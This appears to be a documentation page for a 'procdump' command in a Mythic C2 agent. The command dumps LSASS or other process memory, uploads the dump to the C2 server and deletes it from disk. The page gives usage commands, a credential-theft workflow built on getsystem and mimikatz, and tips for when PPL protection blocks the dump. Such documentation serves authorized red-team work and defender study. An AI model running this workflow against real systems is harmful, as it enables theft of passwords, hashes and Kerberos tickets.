+++
title = "procdump"
chapter = false
weight = 104
hidden = false
+++

{{% notice info %}}
Windows Only
{{% /notice %}}

## Summary

Dump process memory to a minidump file using the Windows `MiniDumpWriteDump` API from `dbghelp.dll`. The dump is automatically uploaded to Mythic via the file transfer system and deleted from disk immediately after upload.

Two actions are available:

- **lsass** — Automatically finds `lsass.exe` by process name and dumps its full memory. This is the primary use case for offline credential extraction (LSASS contains plaintext passwords, NTLM hashes, and Kerberos tickets).
- **dump** — Dumps any process by PID. Useful for dumping other processes of interest.

### Requirements

- **Administrator privileges** — SeDebugPrivilege is required to open protected processes
- **SYSTEM token recommended** — Run `getsystem` first for maximum access
- LSASS may be protected by **Protected Process Light (PPL)** on Windows 10/11, in which case the dump will fail with a clear error message suggesting alternatives

### Arguments

#### action
The dump type to perform. Default: `lsass`.
- `lsass` — Auto-find and dump lsass.exe (no PID required)
- `dump` — Dump a specific process by PID

#### pid
Process ID to dump. Required for `dump` action, ignored for `lsass`.

## Usage

Dump LSASS (default):
```
procdump
```

Explicitly target LSASS:
```
procdump -action lsass
```

Dump a specific process by PID:
```
procdump -action dump -pid 1234
```

## Example Output

### Successful LSASS Dump
```
Successfully dumped lsass.exe (PID 964)
Dump size: 78.4 MB
File uploaded to Mythic and cleaned from disk.
```

### Successful Process Dump
```
Successfully dumped winlogon.exe (PID 3312)
Dump size: 41.3 MB
File uploaded to Mythic and cleaned from disk.
```

### PPL Protected LSASS
```
OpenProcess failed for PID 964 (lsass.exe): Access is denied.
Possible causes:
  - LSASS is running as Protected Process Light (PPL) — check RunAsPPL registry key
  - Credential Guard is enabled
  - Insufficient privileges (need SYSTEM + SeDebugPrivilege)
Tip: Try 'getsystem' first, or dump a non-PPL process with -action dump -pid <PID>
```

## Workflow

1. Run `getsystem` to get SYSTEM token
2. Run `procdump` (or `procdump -action lsass`)
3. Download the dump from Mythic Files tab
4. Analyze offline with `mimikatz` (`sekurlsa::minidump dump.dmp` then `sekurlsa::logonPasswords`)
5. Run `rev2self` to drop SYSTEM privileges

## MITRE ATT&CK Mapping

- T1003.001 — OS Credential Dumping: LSASS Memory
